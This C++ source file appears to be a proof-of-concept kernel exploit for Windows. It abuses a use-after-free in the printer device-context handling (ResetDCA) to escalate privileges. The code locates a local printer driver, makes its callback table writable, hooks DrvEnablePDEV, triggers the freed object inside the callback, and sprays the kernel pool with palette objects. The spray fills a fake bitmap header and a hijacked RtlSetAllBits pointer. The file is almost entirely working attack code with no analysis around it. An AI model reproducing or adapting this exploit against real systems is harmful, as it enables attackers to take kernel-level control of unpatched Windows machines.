#include <Windows.h>
#include <winddi.h>
#include <stdio.h>

typedef BOOL(*pDrvEnableDriver)(
	ULONG iEngineVersion,
	ULONG cj,
	DRVENABLEDATA* pded
	);

typedef void (*pDrvDisableDriver)();
DHPDEV FakeDrvEnablePDEV
(	DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

typedef DHPDEV(*pDrvEnablePDEV)
(	DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

namespace global
{
	LPSTR pPrinterName = nullptr;
	DRVFN fakeDrvfn{ INDEX_DrvEnablePDEV , (PFN)FakeDrvEnablePDEV };
	DRVFN realDrvfn{ INDEX_DrvEnablePDEV, nullptr };
	BOOL TriggerBugFlag = FALSE;
	HDC hdc = 0;
	ULONG64 fakeBitmapHeader = 0x4141414141414141;
	ULONG64 rtlSetAllBits = 0x6161616161616161;
}

void ErrorOutput(const char* msg)
{
	printf(msg);
	printf("[-] Error code: %d\n", GetLastError());
}

void PoolSpray()
{
	// initialize the PLOGPALETTE
	DWORD devobjSize = 0xe20;
	DWORD palNumEntries = (devobjSize - 0x90) / 4;
	DWORD bufSize = sizeof(LOGPALETTE) + (palNumEntries) * sizeof(PALETTEENTRY);
	PLOGPALETTE pLogPalette = (PLOGPALETTE)malloc(bufSize);
	if (!pLogPalette)
	{
		ErrorOutput("[-] Failed to allocate a buffer for PLOGPALETTE\n");
		exit(1);
	}
	pLogPalette->palVersion = 0x300;
	pLogPalette->palNumEntries = palNumEntries;

	// make the pool fengshui
	PULONG64 paletteData = (PULONG64)pLogPalette->palPalEntry;

	// control the arg1(fake BitMapHeader)
	for (DWORD i = 0; i < 0x140; ++i)
	{
		paletteData[i] = global::fakeBitmapHeader;
	}

	// control the function pointer(rtlSetAllBits)
	for (DWORD i = 0x140; i < (palNumEntries * 4) / 8; ++i)
	{
		paletteData[i] = global::rtlSetAllBits;
	}

	// start to make pool spray
	for (DWORD i = 0; i < 5000; ++i)
	{
		CreatePalette(pLogPalette);
	}
}

DHPDEV FakeDrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat,
	HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo,
	DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
	printf("[+] Enter the fake callback\n");
	// call the true function
	pDrvEnablePDEV DrvEnablePDEV = (pDrvEnablePDEV)global::realDrvfn.pfn;
	DHPDEV result = DrvEnablePDEV(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
	if (global::TriggerBugFlag)
	{
		global::TriggerBugFlag = FALSE;
		printf("[+] Trigger the uaf bug\n");

		ResetDCA(global::hdc, nullptr);

		printf("[+] Start pool spray\n");
		PoolSpray();
		printf("[+] Finish pool spray\n");
	}
	return result;
}

// find an available printer and hook its user callback
BOOL HookUserCallbackEntry()
{
	// get the buffer size to store the PRINTER_INFO_4 structures
	DWORD needBytes = 0, returnCount = 0;
	EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, nullptr, 0, &needBytes, &returnCount);
	if (!needBytes) {
		ErrorOutput("[-] Failed to get buffer size for printer structures\n");
		exit(1);
	}

	// allocate a buffer to store the PRINTER_INFO_4 structures
	PPRINTER_INFO_4A pPrinterArray = (PPRINTER_INFO_4A)malloc(needBytes);
	if (!pPrinterArray) {
		ErrorOutput("[-] Failed to allocate a buffer for printer structures\n");
		exit(1);
	}
	if (!EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, (LPBYTE)pPrinterArray, needBytes, &needBytes, &returnCount)) {
		ErrorOutput("[-] Failed to enum printers\n");
		exit(1);
	}

	PRINTER_INFO_4A pPrinterInfo = { 0 };
	// enum printer structure array
	for (DWORD idx = 0; idx < returnCount; ++idx)
	{
		pPrinterInfo = pPrinterArray[idx];
		if (!pPrinterInfo.pPrinterName)
			continue;
		printf("[+] Try the printer: %s\n", pPrinterInfo.pPrinterName);

		// open the printer
		HANDLE hPrinter;
		if (!OpenPrinterA(pPrinterInfo.pPrinterName, &hPrinter, nullptr))
		{
			ErrorOutput("[-] Failed to open the printer\n");
			continue;
		}
		printf("[+] Open the driver: %s\n", pPrinterInfo.pPrinterName);

		// get the driver path
		needBytes = 0;
		GetPrinterDriverA(hPrinter, nullptr, 2, nullptr, 0, &needBytes);
		if (!needBytes)
		{
			ErrorOutput("[-] Failed to get buffer size for printer driver structures\n");
			continue;
		}
		PDRIVER_INFO_2A pDriverArray = (PDRIVER_INFO_2A)malloc(needBytes);
		if (!pDriverArray)
			ErrorOutput("[-] Failed to allocate a buffer for driver structures\n");
		if (!GetPrinterDriverA(hPrinter, nullptr, 2, (LPBYTE)pDriverArray, needBytes, &needBytes))
		{
			ErrorOutput("[-] Failed to enum the printer drivers\n");
			continue;
		}
		printf("[+] Driver path: %s\n", pDriverArray->pDriverPath);

		// load the driver to memory with the absolute path
		HMODULE hDriver = LoadLibraryExA(pDriverArray->pDriverPath, nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
		if (!hDriver)
		{
			ErrorOutput("[-] Failed to load the driver to memory\n");
			continue;
		}
		global::pPrinterName = pPrinterInfo.pPrinterName;

		// get the function address
		pDrvEnableDriver DrvEnableDriver = nullptr;
		pDrvDisableDriver DrvDisableDriver = nullptr;
		DrvEnableDriver = (pDrvEnableDriver)GetProcAddress(hDriver, "DrvEnableDriver");
		DrvDisableDriver = (pDrvDisableDriver)GetProcAddress(hDriver, "DrvDisableDriver");
		if (!DrvEnableDriver || !DrvDisableDriver)
		{
			ErrorOutput("[-] Failed to get the function address\n");
			continue;
		}
		printf("[+] Get the DrvEnableDriver address: 0x%I64x\n", (ULONG64)DrvEnableDriver);
		printf("[+] Get the DrvDisableDriver address: 0x%I64x\n", (ULONG64)DrvDisableDriver);

		// get the driver's callback table
		DRVENABLEDATA drvEnableData;
		if (!DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(drvEnableData), &drvEnableData))
		{
			ErrorOutput("[-] Failed to get the drvEnableData\n");
			continue;
		}

		// enable the driver notice!!!
		DWORD protectValue = 0;
		if (!VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), PAGE_READWRITE, &protectValue))
		{
			ErrorOutput("[-] Failed to unprotecy the callback table\n");
			continue;
		}

		// hook the callback table entry
		for (DWORD idx = 0; idx < drvEnableData.c; ++idx)
		{
			if (drvEnableData.pdrvfn[idx].iFunc == global::fakeDrvfn.iFunc)
			{
				global::realDrvfn.pfn = drvEnableData.pdrvfn[idx].pfn;
				drvEnableData.pdrvfn[idx].pfn = global::fakeDrvfn.pfn;
				break;
			}
		}

		// diable the driver
		DrvDisableDriver();

		// reprotect the callback table
		VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), protectValue, &protectValue);

		printf("[+] Get real callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::realDrvfn.pfn);
		printf("[+] Get fake callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::fakeDrvfn.pfn);
		return TRUE;
	}

	return FALSE;
}

int main()
{
	BOOL res = HookUserCallbackEntry();
	if (!res)
	{
		ErrorOutput("[-] Failed to hook the callback table\n");
		exit(1);
	}
	global::hdc = CreateDCA(nullptr, global::pPrinterName, nullptr, nullptr);
	if (!global::hdc)
	{
		ErrorOutput("[-] Failed to create dc\n");
		exit(1);
	}

	global::TriggerBugFlag = TRUE;
	ResetDCA(global::hdc, nullptr);
	return 0;
}